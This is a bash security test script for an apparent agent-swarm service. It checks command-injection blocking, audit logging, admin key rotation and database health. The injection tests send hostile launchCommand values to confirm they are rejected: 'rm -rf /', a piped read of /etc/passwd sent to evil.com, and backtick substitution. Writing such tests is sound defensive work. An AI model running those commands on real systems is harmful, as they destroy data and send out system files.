#!/bin/bash
# v0.4 QA Test Suite — Security & Compliance
# Usage: SWARM_ADMIN_KEY=<key> bash tests/v04-security-tests.sh [service_url]

SERVICE="${1:-http://127.0.0.1:3001}"
ADMIN_KEY="${SWARM_ADMIN_KEY:-}"
PASS=0
FAIL=0
SKIP=0

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'

log_pass() { PASS=$((PASS+1)); echo -e "${GREEN}PASS${NC} $1"; }
log_fail() { FAIL=$((FAIL+1)); echo -e "${RED}FAIL${NC} $1 — $2"; }
log_skip() { SKIP=$((SKIP+1)); echo -e "${YELLOW}SKIP${NC} $1 — $2"; }

api() {
  curl -s -w "\n%{http_code}" -X "$1" "$SERVICE$2" -H "Content-Type: application/json" ${3:+-d "$3"} 2>/dev/null
}
api_auth() {
  local TOKEN="$1"; shift
  curl -s -w "\n%{http_code}" -X "$1" "$SERVICE$2" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" ${3:+-d "$3"} 2>/dev/null
}
get_body() { echo "$1" | head -n -1; }
get_code() { echo "$1" | tail -1; }
jf() { echo "$1" | node -e "process.stdin.on('data',d=>{try{const j=JSON.parse(d);const p='$2'.split('.');let r=j;for(const k of p)r=r?.[k];console.log(r===undefined?'':typeof r==='object'?JSON.stringify(r):r)}catch{console.log('')}})" 2>/dev/null; }
api_adm() { if [ -n "$ADMIN_KEY" ]; then api_auth "$ADMIN_KEY" "$@"; else api "$@"; fi; }

echo "============================================"
echo " v0.4 Security & Compliance Tests — $(date)"
echo " Service: $SERVICE"
echo "============================================"
echo ""

# ── Preflight ──────────────────────────────────────────────────
echo "--- Preflight ---"
HEALTH_RESP=$(api GET /health)
if [ "$(get_code "$HEALTH_RESP")" = "200" ]; then
  log_pass "Preflight: Service healthy"
else
  echo -e "${RED}Service not reachable. Aborting.${NC}"; exit 1
fi

if [ -z "$ADMIN_KEY" ]; then
  echo -e "${YELLOW}WARNING: SWARM_ADMIN_KEY not set. Admin tests skipped.${NC}"
fi

TS=$(date +%s)
AGENT_SEC="qa-sec-$TS"

# Create test agent
if [ -n "$ADMIN_KEY" ]; then
  api_auth "$ADMIN_KEY" POST /agents/create "{\"id\":\"$AGENT_SEC\",\"name\":\"Security Test\",\"description\":\"sec test\",\"cwd\":\"C:/tmp\"}" > /dev/null
fi
RESP_SEC=$(api POST /agents "{\"id\":\"$AGENT_SEC\",\"name\":\"Security Test\",\"description\":\"sec test\"}")
KEY_SEC=$(jf "$(get_body "$RESP_SEC")" "apiKey")
log_pass "Preflight: Test agent created"

# ── TCI: Command Injection ────────────────────────────────────
echo ""
echo "--- TCI: Command Injection Prevention ---"

if [ -n "$ADMIN_KEY" ]; then
  # TCI.1 — Malicious launchCommand blocked
  RESP=$(api_auth "$ADMIN_KEY" PATCH "/agents/$AGENT_SEC" '{"launchCommand":"; rm -rf /"}')
  CODE=$(get_code "$RESP")
  BODY=$(get_body "$RESP")
  if [ "$CODE" = "400" ]; then
    log_pass "TCI.1: Malicious command \"; rm -rf /\" → 400 blocked"
  elif echo "$BODY" | grep -q "rm -rf"; then
    log_fail "TCI.1: Command injection" "Malicious command was ACCEPTED (HTTP $CODE)"
  else
    log_pass "TCI.1: Malicious command rejected or sanitized ($CODE)"
  fi

  # TCI.2 — Shell metacharacters blocked
  RESP=$(api_auth "$ADMIN_KEY" PATCH "/agents/$AGENT_SEC" '{"launchCommand":"echo pwned && curl evil.com"}')
  CODE=$(get_code "$RESP")
  if [ "$CODE" = "400" ]; then
    log_pass "TCI.2: Shell metacharacters (&&) → 400 blocked"
  else
    log_fail "TCI.2: Shell metacharacters" "HTTP $CODE (expected 400)"
  fi

  # TCI.3 — Backtick injection blocked
  RESP=$(api_auth "$ADMIN_KEY" PATCH "/agents/$AGENT_SEC" '{"launchCommand":"`whoami`"}')
  CODE=$(get_code "$RESP")
  if [ "$CODE" = "400" ]; then
    log_pass "TCI.3: Backtick injection → 400 blocked"
  else
    log_fail "TCI.3: Backtick injection" "HTTP $CODE"
  fi

  # TCI.4 — Pipe injection blocked
  RESP=$(api_auth "$ADMIN_KEY" PATCH "/agents/$AGENT_SEC" '{"launchCommand":"cat /etc/passwd | curl evil.com"}')
  CODE=$(get_code "$RESP")
  if [ "$CODE" = "400" ]; then
    log_pass "TCI.4: Pipe injection → 400 blocked"
  else
    log_fail "TCI.4: Pipe injection" "HTTP $CODE"
  fi

  # TCI.5 — Valid command allowed
  RESP=$(api_auth "$ADMIN_KEY" PATCH "/agents/$AGENT_SEC" '{"launchCommand":"claude --continue --dangerously-skip-permissions"}')
  CODE=$(get_code "$RESP")
  if [ "$CODE" = "200" ]; then
    log_pass "TCI.5: Valid claude command → 200 allowed"
  else
    log_fail "TCI.5: Valid command" "HTTP $CODE (expected 200)"
  fi

  # TCI.6 — Another valid pattern
  RESP=$(api_auth "$ADMIN_KEY" PATCH "/agents/$AGENT_SEC" '{"launchCommand":"claude --dangerously-load-development-channels server:swarm-plugin --dangerously-skip-permissions"}')
  CODE=$(get_code "$RESP")
  if [ "$CODE" = "200" ]; then
    log_pass "TCI.6: Default launch command → 200 allowed"
  else
    log_fail "TCI.6: Default command" "HTTP $CODE"
  fi
else
  log_skip "TCI.1-TCI.6" "No admin key"
fi

# ── TAL: Audit Log ───────────────────────────────────────────
echo ""
echo "--- TAL: Audit Log ---"

# TAL.1 — Audit endpoint exists
RESP=$(api_adm GET /audit)
CODE=$(get_code "$RESP")
if [ "$CODE" = "200" ]; then
  log_pass "TAL.1: GET /audit → 200"
else
  RESP2=$(api_adm GET /audit/logs)
  CODE2=$(get_code "$RESP2")
  if [ "$CODE2" = "200" ]; then
    log_pass "TAL.1: GET /audit/logs → 200"
  else
    log_fail "TAL.1: Audit endpoint" "HTTP $CODE (tried /audit and /audit/logs)"
  fi
fi

# TAL.2 — Agent creation logged
AGENT_AUDIT="qa-audit-$TS"
if [ -n "$ADMIN_KEY" ]; then
  api_auth "$ADMIN_KEY" POST /agents/create "{\"id\":\"$AGENT_AUDIT\",\"name\":\"Audit Test\",\"description\":\"audit\",\"cwd\":\"C:/tmp\"}" > /dev/null
fi
api POST /agents "{\"id\":\"$AGENT_AUDIT\",\"name\":\"Audit Test\",\"description\":\"audit\"}" > /dev/null

RESP=$(api_adm GET "/audit?action=agent_registered")
if [ "$(get_code "$RESP")" = "200" ]; then
  BODY=$(get_body "$RESP")
  if echo "$BODY" | grep -q "$AGENT_AUDIT"; then
    log_pass "TAL.2: Agent creation in audit log"
  else
    # Try without filter
    RESP_ALL=$(api_adm GET /audit)
    if echo "$(get_body "$RESP_ALL")" | grep -q "$AGENT_AUDIT"; then
      log_pass "TAL.2: Agent creation in audit log (unfiltered)"
    else
      log_fail "TAL.2: Agent creation audit" "Agent $AGENT_AUDIT not found in audit"
    fi
  fi
else
  log_skip "TAL.2" "Audit endpoint not available"
fi

# TAL.3 — Edge change logged
if [ -n "$ADMIN_KEY" ]; then
  api_auth "$ADMIN_KEY" POST /edges "{\"from\":\"$AGENT_SEC\",\"to\":\"$AGENT_AUDIT\"}" > /dev/null
  RESP=$(api_adm GET /audit)
  BODY=$(get_body "$RESP")
  if echo "$BODY" | grep -qi "edge"; then
    log_pass "TAL.3: Edge change in audit log"
  else
    log_fail "TAL.3: Edge audit" "No edge entry in audit"
  fi
else
  log_skip "TAL.3" "No admin key"
fi

# TAL.4 — Auth failure logged
api_auth "invalid-key-xyz" GET /agents > /dev/null
RESP=$(api_adm GET /audit)
BODY=$(get_body "$RESP")
if echo "$BODY" | grep -qi "auth\|fail\|denied\|unauthorized"; then
  log_pass "TAL.4: Auth failure in audit log"
else
  log_fail "TAL.4: Auth failure audit" "No auth failure entry"
fi

# TAL.5 — Audit log is admin-only
if [ -n "$KEY_SEC" ]; then
  RESP=$(api_auth "$KEY_SEC" GET /audit)
  CODE=$(get_code "$RESP")
  if [ "$CODE" = "403" ]; then
    log_pass "TAL.5: Audit log admin-only → 403"
  else
    log_fail "TAL.5: Audit access" "Expected 403, got $CODE"
  fi
else
  log_skip "TAL.5" "No agent key"
fi

# ── TKR: Admin Key Rotation ──────────────────────────────────
echo ""
echo "--- TKR: Admin Key Rotation ---"

if [ -n "$ADMIN_KEY" ]; then
  # TKR.1 — Rotation endpoint exists
  RESP=$(api_auth "$ADMIN_KEY" POST /admin/rotate-key)
  CODE=$(get_code "$RESP")
  BODY=$(get_body "$RESP")
  NEW_KEY=$(jf "$BODY" "adminKey")
  if [ "$CODE" = "200" ] && [ -n "$NEW_KEY" ]; then
    log_pass "TKR.1: POST /admin/rotate-key → 200, new key received"

    # TKR.2 — New key works
    RESP2=$(api_auth "$NEW_KEY" GET /agents)
    CODE2=$(get_code "$RESP2")
    if [ "$CODE2" = "200" ]; then
      log_pass "TKR.2: New admin key works → 200"
    else
      log_fail "TKR.2: New key" "HTTP $CODE2"
    fi

    # TKR.3 — Old key no longer works
    RESP3=$(api_auth "$ADMIN_KEY" GET /agents)
    CODE3=$(get_code "$RESP3")
    if [ "$CODE3" = "401" ]; then
      log_pass "TKR.3: Old admin key rejected → 401"
    else
      log_fail "TKR.3: Old key" "Expected 401, got $CODE3 (old key still works!)"
    fi

    # Update ADMIN_KEY for remaining tests
    ADMIN_KEY="$NEW_KEY"

    # TKR.4 — Rotate again (verify chain)
    RESP4=$(api_auth "$ADMIN_KEY" POST /admin/rotate-key)
    CODE4=$(get_code "$RESP4")
    NEW_KEY2=$(jf "$(get_body "$RESP4")" "adminKey")
    if [ "$CODE4" = "200" ] && [ -n "$NEW_KEY2" ] && [ "$NEW_KEY2" != "$NEW_KEY" ]; then
      log_pass "TKR.4: Second rotation → new unique key"
      ADMIN_KEY="$NEW_KEY2"
    else
      log_fail "TKR.4: Chain rotation" "HTTP $CODE4"
    fi
  else
    log_fail "TKR.1: Rotation endpoint" "HTTP $CODE, key='$NEW_KEY'"
    log_skip "TKR.2-TKR.4" "Rotation failed"
  fi
else
  log_skip "TKR.1-TKR.4" "No admin key"
fi

# ── TDB: DB Integrity ────────────────────────────────────────
echo ""
echo "--- TDB: DB Integrity ---"

RESP=$(api GET /health)
BODY=$(get_body "$RESP")

# TDB.1 — Database check in health
DB_STATUS=$(echo "$BODY" | node -e "process.stdin.on('data',d=>{try{const j=JSON.parse(d);console.log(j.checks?.database?.status??j.database?.status??j.dbStatus??'')}catch{console.log('')}})" 2>/dev/null)
if [ "$DB_STATUS" = "ok" ] || [ "$DB_STATUS" = "healthy" ]; then
  log_pass "TDB.1: Database health check = $DB_STATUS"
elif [ -n "$DB_STATUS" ]; then
  log_fail "TDB.1: DB health" "status=$DB_STATUS (expected ok)"
else
  log_skip "TDB.1" "No database status in health"
fi

# TDB.2 — SQLite file exists
DB_FILE="${USERPROFILE:-$HOME}/.swarm-channel/swarm.db"
if [ -f "$DB_FILE" ]; then
  DB_SIZE=$(wc -c < "$DB_FILE" | tr -d ' ')
  log_pass "TDB.2: SQLite DB exists ($DB_SIZE bytes)"
else
  log_skip "TDB.2" "DB file not at $DB_FILE"
fi

# ── TBC: Backward Compatibility ──────────────────────────────
echo ""
echo "--- TBC: Backward Compatibility ---"

# TBC.1 — Messages work
AGENT_BC="qa-bc-$TS"
if [ -n "$ADMIN_KEY" ]; then
  api_auth "$ADMIN_KEY" POST /agents/create "{\"id\":\"$AGENT_BC\",\"name\":\"BC\",\"description\":\"bc test\",\"cwd\":\"C:/tmp\"}" > /dev/null
fi
api POST /agents "{\"id\":\"$AGENT_BC\",\"name\":\"BC\",\"description\":\"bc test\"}" > /dev/null
api_adm POST /edges "{\"from\":\"$AGENT_SEC\",\"to\":\"$AGENT_BC\"}" > /dev/null

RESP=$(api POST /messages "{\"from\":\"$AGENT_SEC\",\"to\":\"$AGENT_BC\",\"content\":\"backward compat\"}")
CODE=$(get_code "$RESP")
if [ "$CODE" = "200" ]; then
  log_pass "TBC.1: POST /messages → 200"
else
  log_fail "TBC.1: Messages" "HTTP $CODE"
fi

# TBC.2 — Tasks work
RESP=$(api POST /tasks "{\"toAgent\":\"$AGENT_BC\",\"fromAgent\":\"$AGENT_SEC\",\"title\":\"bc task\"}")
CODE=$(get_code "$RESP")
if [ "$CODE" = "200" ] || [ "$CODE" = "201" ]; then
  log_pass "TBC.2: POST /tasks → $CODE"
else
  log_fail "TBC.2: Tasks" "HTTP $CODE"
fi

# TBC.3 — Topology
RESP=$(api_adm GET /topology)
CODE=$(get_code "$RESP")
if [ "$CODE" = "200" ]; then
  log_pass "TBC.3: GET /topology → 200"
else
  log_fail "TBC.3: Topology" "HTTP $CODE"
fi

# TBC.4 — Metrics
RESP=$(api GET /metrics)
CODE=$(get_code "$RESP")
if [ "$CODE" = "200" ]; then
  log_pass "TBC.4: GET /metrics → 200"
else
  log_fail "TBC.4: Metrics" "HTTP $CODE"
fi

# ── Cleanup ────────────────────────────────────────────────────
echo ""
echo "--- Cleanup ---"
api_adm DELETE "/agents/$AGENT_SEC" > /dev/null 2>&1
api_adm DELETE "/agents/$AGENT_AUDIT" > /dev/null 2>&1
api_adm DELETE "/agents/$AGENT_BC" > /dev/null 2>&1
log_pass "Cleanup: Test agents removed"

# ── Summary ────────────────────────────────────────────────────
echo ""
echo "============================================"
echo " RESULTS: ${PASS} passed, ${FAIL} failed, ${SKIP} skipped"
echo "============================================"
echo ""

if [ "$FAIL" -gt 0 ]; then
  echo -e "${RED}SOME TESTS FAILED${NC}"
  exit 1
else
  echo -e "${GREEN}ALL AUTOMATED TESTS PASSED${NC}"
  exit 0
fi
